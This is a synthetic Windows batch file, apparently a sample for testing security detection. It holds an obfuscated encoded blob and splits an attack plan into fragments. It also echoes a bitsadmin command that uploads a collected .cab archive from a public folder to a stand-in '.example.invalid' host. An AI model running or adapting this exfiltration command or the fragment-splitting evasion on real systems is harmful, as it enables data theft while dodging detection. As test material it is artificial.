@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|reverse_xor
rem HUNTRESS-MATERIAL:V1JcX0NGHFdaX1JFXVodVl9DXlJLVh0FA1dRAgBSAApSHBwJQENHR1sOX0FGbFdSXF9DRk9RUlAdBQNXUQIAUgAKUh5HUFZfX1xQb1FSf0BAVkFHXUZ7b1BaX1FGY29AQVZAZm8JcA5bR1JDbFZQQUZcQE8FA1dRAgBSAApSHl1UWlJDXlJQDldabF1UWlJDXlJQT1ZdXF0OVlRSRlRdUl9sR0tWXU9WX1RdWkAOW0NSQVRPAg5HXUZcUGxWVFJHQE9WS1YdXVpeV1JAR1pRDkFWR0NSV1JPVkdcXlZBbFdSXF9DRh9BVlVAXVJBR2xWQVJDVkFDH19SUFxfbFZHUlBcXw5AQ1ZHQE8CDkU=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsad"
set "FrAg1=min.exe|stage_count=1|graph=single|next_language=none|campaign_id=ca"
set "FrAg2=mpaign-a93a31bd06|source_path=C:\Users\Public\HuntressLab\collect-a9"
set "FrAg3=3a31bd06.cab|upload_url=https://a93a31bd06.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
ver >nul
if errorlevel 1 exit /b 1
set "ReCoVeReD=!FrAg0!!FrAg1!!FrAg2!!FrAg3!"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-a93a31bd06.cab to https://a93a31bd06.example.invalid/upload
exit /b 0
